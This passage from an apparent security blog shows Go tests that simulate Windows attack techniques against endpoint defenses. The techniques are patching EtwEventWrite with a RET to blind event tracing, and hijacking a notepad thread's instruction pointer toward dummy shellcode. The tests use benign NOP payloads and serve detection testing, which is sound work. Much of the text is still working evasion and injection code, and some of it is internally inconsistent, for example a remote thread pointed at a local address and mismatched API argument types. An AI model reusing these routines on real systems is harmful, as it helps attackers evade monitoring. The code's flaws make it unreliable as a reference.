</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to allocate memory for trampoline: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// write trampoline to allocated memory
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	trampolineAddr <span style="color:#ff79c6">:=</span> (<span style="color:#8be9fd">uintptr</span>)(unsafe.<span style="color:#50fa7b">Pointer</span>(trampoline))
</span></span><span style="display:flex;"><span>	trampolineSize <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">uintptr</span>(unsafe.<span style="color:#50fa7b">Sizeof</span>(trampoline))
</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">copy</span>((<span style="color:#ff79c6">*</span>(<span style="color:#ff79c6">*</span>[<span style="color:#bd93f9">1</span> <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">20</span>]<span style="color:#8be9fd">byte</span>)(unsafe.<span style="color:#50fa7b">Pointer</span>(mem)))[:], (<span style="color:#ff79c6">*</span>(<span style="color:#ff79c6">*</span>[<span style="color:#bd93f9">1</span> <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">20</span>]<span style="color:#8be9fd">byte</span>)(unsafe.<span style="color:#50fa7b">Pointer</span>(trampolineAddr)))[:trampolineSize])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// call trampoline to alter call stack
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	syscall.<span style="color:#50fa7b">Syscall</span>(trampolineAddr, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">cleanup</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Cleanup completed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><h2 id="evasion-via-event-tracing-for-windows-patching">evasion via event tracing for windows patching</h2>
<p><strong>ETW patching</strong> is when the Event Tracing for Windows (ETW) is disabled/modified. ETW is a key feature in Windows, used to log + trace events within the OS. by patching ETW, security tools can be prevented from logging malicious activity and attackers can evade detection.</p>
<p>the test first allocates memory within the target process and simulates patching ETW-related functions inside <code>ntdll.dll</code>. it replaces these functions with a simple <code>RET</code>, effectively disabling ETW logging for certain events.</p>
<p>it also includes a verification step to ensure that the patch was applied successfully, indicating an attempt to disable ETW.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">main</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Starting Evasion via Event Tracing for Windows Patching [+]&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Start</span>(test, cleanup)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	procHandle <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">Handle</span>(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">var</span> err <span style="color:#8be9fd">error</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// start process
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	cmd <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;notepad.exe&#34;</span>)
</span></span><span style="display:flex;"><span>	err = cmd.<span style="color:#50fa7b">Start</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to start process: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">defer</span> cmd.Process.<span style="color:#50fa7b">Kill</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// get process handle
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	procHandle, err = windows.<span style="color:#50fa7b">OpenProcess</span>(windows.PROCESS_ALL_ACCESS, <span style="color:#ff79c6">false</span>, <span style="color:#8be9fd;font-style:italic">uint32</span>(cmd.Process.Pid))
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to get process handle: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// allocate memory in target
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#8be9fd;font-style:italic">var</span> remoteAddr <span style="color:#8be9fd">uintptr</span>
</span></span><span style="display:flex;"><span>	remoteAddr, err = windows.<span style="color:#50fa7b">VirtualAllocEx</span>(procHandle, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">4096</span>, windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to allocate memory: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// write dummy data to allocate memory [NOP slide to simulate patching]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	dummyData <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">byte</span>{<span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>}
</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">var</span> written <span style="color:#8be9fd">uint32</span>
</span></span><span style="display:flex;"><span>	err = windows.<span style="color:#50fa7b">WriteProcessMemory</span>(procHandle, remoteAddr, <span style="color:#ff79c6">&amp;</span>dummyData[<span style="color:#bd93f9">0</span>], <span style="color:#8be9fd;font-style:italic">uint32</span>(<span style="color:#8be9fd;font-style:italic">len</span>(dummyData)), <span style="color:#ff79c6">&amp;</span>written)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> <span style="color:#ff79c6">||</span> written <span style="color:#ff79c6">!=</span> <span style="color:#8be9fd;font-style:italic">uint32</span>(<span style="color:#8be9fd;font-style:italic">len</span>(dummyData)) {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to write to process memory: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Verify the memory was patched
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#50fa7b">verifyMemoryPatch</span>(procHandle, remoteAddr, dummyData)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Attempt to patch ETW functions
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#50fa7b">patchETW</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] ETW patching executed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED: Malicious behavior not blocked
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">patchETW</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// patching ETW functions in ntdll.dll
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	ntdll <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">NewLazySystemDLL</span>(<span style="color:#f1fa8c">&#34;ntdll.dll&#34;</span>)
</span></span><span style="display:flex;"><span>	etwEventWrite <span style="color:#ff79c6">:=</span> ntdll.<span style="color:#50fa7b">NewProc</span>(<span style="color:#f1fa8c">&#34;EtwEventWrite&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// allocate memory for patch
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	mem, err <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">VirtualAlloc</span>(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">4096</span>, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to allocate memory for ETW patch: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// write patch to memory
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	patch <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">byte</span>{<span style="color:#bd93f9">0xC3</span>} <span style="color:#6272a4">// RET instruction to bypass function
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#8be9fd;font-style:italic">copy</span>((<span style="color:#ff79c6">*</span>(<span style="color:#ff79c6">*</span>[<span style="color:#bd93f9">1</span> <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">20</span>]<span style="color:#8be9fd">byte</span>)(unsafe.<span style="color:#50fa7b">Pointer</span>(mem)))[:], patch)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// patch EtwEventWrite
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	err = windows.<span style="color:#50fa7b">WriteProcessMemory</span>(windows.<span style="color:#50fa7b">CurrentProcess</span>(), etwEventWrite.<span style="color:#50fa7b">Addr</span>(), <span style="color:#ff79c6">&amp;</span>patch[<span style="color:#bd93f9">0</span>], <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#8be9fd;font-style:italic">len</span>(patch)), <span style="color:#ff79c6">nil</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to patch EtwEventWrite: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">verifyMemoryPatch</span>(procHandle windows.Handle, remoteAddr <span style="color:#8be9fd">uintptr</span>, expectedData []<span style="color:#8be9fd">byte</span>) {
</span></span><span style="display:flex;"><span>	buffer <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">make</span>([]<span style="color:#8be9fd">byte</span>, <span style="color:#8be9fd;font-style:italic">len</span>(expectedData))
</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">var</span> read <span style="color:#8be9fd">uint32</span>
</span></span><span style="display:flex;"><span>	err <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">ReadProcessMemory</span>(procHandle, remoteAddr, <span style="color:#ff79c6">&amp;</span>buffer[<span style="color:#bd93f9">0</span>], <span style="color:#8be9fd;font-style:italic">uint32</span>(<span style="color:#8be9fd;font-style:italic">len</span>(buffer)), <span style="color:#ff79c6">&amp;</span>read)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> <span style="color:#ff79c6">||</span> read <span style="color:#ff79c6">!=</span> <span style="color:#8be9fd;font-style:italic">uint32</span>(<span style="color:#8be9fd;font-style:italic">len</span>(buffer)) <span style="color:#ff79c6">||</span> !<span style="color:#50fa7b">compareBuffers</span>(buffer, expectedData) {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[-] Memory patch verification failed&#34;</span>)
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Memory patch verification succeeded&#34;</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">compareBuffers</span>(buf1, buf2 []<span style="color:#8be9fd">byte</span>) <span style="color:#8be9fd">bool</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">len</span>(buf1) <span style="color:#ff79c6">!=</span> <span style="color:#8be9fd;font-style:italic">len</span>(buf2) {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> buf1 {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> buf1[i] <span style="color:#ff79c6">!=</span> buf2[i] {
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">return</span> <span style="color:#ff79c6">true</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">cleanup</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Cleanup completed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><h2 id="remote-thread-context-manipulation">remote thread context manipulation</h2>
<p>attackers can modify the execution context of a thread in a remote process, allowing them to execute arbitrary code within the process. this happens a lot with process injection attacks.</p>
<p>the test first retrieves the context of the main thread of the target process and modifies its instruction pointer (<code>RIP</code>) to point to the address of injected shellcode. attackers can hijack threads to execute payloads this way.</p>
<p>by changing the thread&rsquo;s context, the test forces the process to execute the injected code, simulating the achievement of remote code execution.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">main</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Starting Remote Thread Context Manipulation [+]&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Start</span>(test, cleanup)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Start a target process to work with
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	cmd <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;notepad.exe&#34;</span>)
</span></span><span style="display:flex;"><span>	err <span style="color:#ff79c6">:=</span> cmd.<span style="color:#50fa7b">Start</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to start process: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">defer</span> cmd.Process.<span style="color:#50fa7b">Kill</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Get handle to the target process
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	procHandle, err <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">OpenProcess</span>(windows.PROCESS_ALL_ACCESS, <span style="color:#ff79c6">false</span>, <span style="color:#8be9fd;font-style:italic">uint32</span>(cmd.Process.Pid))
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to get process handle: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// main thread of target proc
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	threadHandle, err <span style="color:#ff79c6">:=</span> <span style="color:#50fa7b">getMainThreadHandle</span>(cmd.Process.Pid)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to get main thread handle: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// manipulating thread context
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#8be9fd;font-style:italic">var</span> context windows.Context
</span></span><span style="display:flex;"><span>	context.ContextFlags = windows.CONTEXT_FULL
</span></span><span style="display:flex;"><span>	err = windows.<span style="color:#50fa7b">GetThreadContext</span>(threadHandle, <span style="color:#ff79c6">&amp;</span>context)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to get thread context: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// change thread context: change instruction pointer to shellcode address
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	context.Rip = <span style="color:#8be9fd;font-style:italic">uintptr</span>(unsafe.<span style="color:#50fa7b">Pointer</span>(<span style="color:#ff79c6">&amp;</span>dummyShellcode[<span style="color:#bd93f9">0</span>]))
</span></span><span style="display:flex;"><span>	err = windows.<span style="color:#50fa7b">SetThreadContext</span>(threadHandle, <span style="color:#ff79c6">&amp;</span>context)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to set thread context: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Remote thread context manipulation executed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED: Malicious behavior not blocked
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">getMainThreadHandle</span>(pid <span style="color:#8be9fd">int</span>) (windows.Handle, <span style="color:#8be9fd">error</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">var</span> snapshot windows.Handle
</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">var</span> entry windows.ThreadEntry32
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// take snapshot of specified processes
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#6272a4">// 
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	snapshot, err <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">CreateToolhelp32Snapshot</span>(windows.TH32CS_SNAPTHREAD, <span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>, err
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">defer</span> windows.<span style="color:#50fa7b">CloseHandle</span>(snapshot)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	entry.Size = <span style="color:#8be9fd;font-style:italic">uint32</span>(unsafe.<span style="color:#50fa7b">Sizeof</span>(entry))
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// retrieve info about first thread of process from snapshot
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	err = windows.<span style="color:#50fa7b">Thread32First</span>(snapshot, <span style="color:#ff79c6">&amp;</span>entry)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>, err
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> entry.OwnerProcessID <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">uint32</span>(pid) {
</span></span><span style="display:flex;"><span>			threadHandle, err <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">OpenThread</span>(windows.THREAD_ALL_ACCESS, <span style="color:#ff79c6">false</span>, entry.ThreadID)
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>, err
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">return</span> threadHandle, <span style="color:#ff79c6">nil</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		err = windows.<span style="color:#50fa7b">Thread32Next</span>(snapshot, <span style="color:#ff79c6">&amp;</span>entry)
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">break</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>, fmt.<span style="color:#50fa7b">Errorf</span>(<span style="color:#f1fa8c">&#34;no main thread found for process %d&#34;</span>, pid)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> dummyShellcode = []<span style="color:#8be9fd">byte</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">cleanup</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Cleanup completed successfully&#34;</span>)
